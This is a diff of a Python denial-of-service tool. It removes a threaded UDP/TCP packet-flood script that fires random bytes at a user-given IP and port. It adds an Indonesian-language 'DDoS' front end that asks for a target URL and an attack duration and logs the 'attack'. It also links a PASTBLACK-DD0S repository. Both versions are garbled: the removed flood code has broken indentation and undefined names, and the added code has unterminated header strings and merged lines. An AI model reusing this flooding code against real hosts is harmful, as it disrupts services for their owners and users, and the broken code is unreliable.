@@ -1,50 +1,120 @@
-#!/usr/bin/env python
-import os
-import sys
-import time
-import random
-import threading
-import socket
+# -*- coding: utf-8 -*-                                                                                                                    import os
+import requests
+import datetime
+import asyncio
+import validators
+from urllib.parse import urlparse
+from sys import stdout
+from colorama import Fore, Style, init
+import logging                                                                                                                             
+# Inisialisasi Colorama dan Logging                                                                                                        init(autoreset=True)
+                                                                                                                                           # Pengaturan Logging yang benar
+logging.basicConfig(
+    filename='attack.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',  # Perbaiki dari levellevel menjadi levelname                                          datefmt='%Y-%m-%d %H:%M:%S'
+)
 
-if len(sys.argv) < 4:
-    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")
+# Fungsi untuk Logging Informasi Serangan
+def log_attack_status(message, level='info', print_to_terminal=True):
+    if level == 'info':
+        logging.info(message)
+        if print_to_terminal:
+            print(f"{Fore.CYAN}|    [INFO] {message.ljust(63)}|")
+    elif level == 'error':
+        logging.error(message)
+        if print_to_terminal:
+            print(f"{Fore.RED}|    [ERROR] {message.ljust(63)}|")
+    elif level == 'warning':
+        logging.warning(message)
+        if print_to_terminal:
+            print(f"{Fore.YELLOW}|    [WARNING] {message.ljust(63)}|")
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-packets = int(sys.argv[3])
-sent = 0
 
-class syn(threading.Thread):
-    def __init__(self, ip, port, packets):
-        self.ip = ip
-        self.port = port
-        self.packets = packets
-        self.syn = socket.socket()
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                self.syn.connect((self.ip, self.port))
-            except:
-                pass
-                
-                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-                syn = socket.socket()
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-                if port == "0":
-                        port = random.randrange(1, 65535)
-                s.connect((ip, port))
-                s.send(data)
-                bytes = random._urandom(size)
-                syn.connect((ip, port))
-                udp.sendto(bytes,(ip, port))
-                sent = sent + 1
-                print("DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s")%(ip, port, size, t1m3, sent)
-				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
-        except  KeyboardInterrupt():
-                print("Stopping Flood!")
-                sys.exit()
-        except (socket.error, msg):
-                print("Socket Couldn't Connect")
-                sys.exit()
+# Fungsi untuk Menampilkan Header BASE dengan Warna
+def display_header():
+    header_lines = [ 
+    f"{Fore.GREEN}     
+    f"{Fore.GREEN}     
+    f"{Fore.GREEN}     
+    f"{Fore.RED}     
+    f"{Fore.RED}     
+    f"{Fore.RED}    
+    f"{Fore.RED}     
+    f"{Fore.RED}    
+    f"{Fore.CYAN}     
+    f"{Fore.CYAN}   
+    f"{Fore.CYAN}     
+    f"{Fore.GREEN}     
+    f"{Fore.YELLOW}    
+     ]
+# Tampilkan header dengan warna
+    for line in header_lines:
+        print("line")
+
+    # Versi dan URL
+    print(f"{Fore.WHITE}{Style.BRIGHT}{' ' * 57}v.1.0")
+    print(f"{Fore.CYAN}{Style.BRIGHT}{' ' * 16}https://github.com/KUNF24/PASTBLACK-DD0S.git")
+    print(f"{Fore.CYAN}|{'=' * 74}|")
+
+# Fungsi untuk Meminta Input dari Pengguna dengan Tampilan Rapi
+def get_user_input(prompt_message):
+    print(f"{Fore.GREEN}|{' ' * 4}[?] {prompt_message.ljust(63)}|")
+    print(f"{Fore.GREEN}|{'=' * 74}|")
+    return input(f"{Fore.YELLOW}{' ' * 4}> ").strip()
+
+# Fungsi Countdown untuk Menampilkan Waktu Serangan
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        remaining_time = (until - datetime.datetime.now()).total_seconds()
+        if remaining_time > 0:
+            stdout.flush()
+            stdout.write(f"\r{Fore.MAGENTA}|    [*] Attack status => {remaining_time:.2f} sec left {' ' * 26}|")
+        else:
+            stdout.flush()
+            stdout.write(f"\r{Fore.MAGENTA}|    [*] Attack Done!{' ' * 53}|\n")
+            print(f"{Fore.CYAN}|{'=' * 74}|")
+            return
+
+# Validasi URL dan Parsing Target
+def get_target(url):
+    if not validators.url(url):
+        log_attack_status(f"URL tidak valid: {url}", level='error')
+        raise ValueError(f"URL tidak valid: {url}")
+
+    target = {
+        'uri': urlparse(url).path or "/",
+        'host': urlparse(url).netloc,
+        'scheme': urlparse(url).scheme,
+        'port': urlparse(url).netloc.split(":")[1] if ":" in urlparse(url).netloc else ("443" if urlparse(url).scheme == "https" else "80")
+    }
+    log_attack_status(f"Target diperoleh: {target['host']} ({target['scheme']}://{target['host']}:{target['port']}{target['uri']})")
+    return target
+
+# Fungsi Serangan Utama
+def launch_attack(target_url, duration):
+    target = get_target(target_url)
+
+    # Inisialisasi Serangan dan Waktu Serangan
+    log_attack_status(f"Meluncurkan serangan ke {target['host']} untuk {duration} detik...")
+    countdown(duration)
+
+if __name__ == "__main__":
+    # Tampilkan Header
+    display_header()
+
+    # Prompt untuk input dari pengguna dengan tampilan yang rapi
+    target_url = get_user_input("Masukkan target URL:   ")
+    while not validators.url(target_url):
+        print(f"{Fore.RED}|    [ERROR] URL tidak valid. Coba lagi.{' ' * 37}|")
+        print(f"{Fore.CYAN}|{'=' * 74}|")
+        target_url = get_user_input("Masukkan target URL:")
+
+    try:
+        attack_duration = int(get_user_input("Masukkan durasi serangan (detik):"))
+    except ValueError:
+        attack_duration = 60  # Default durasi
+
+    # Luncurkan serangan
+    launch_attack(target_url, attack_duration)
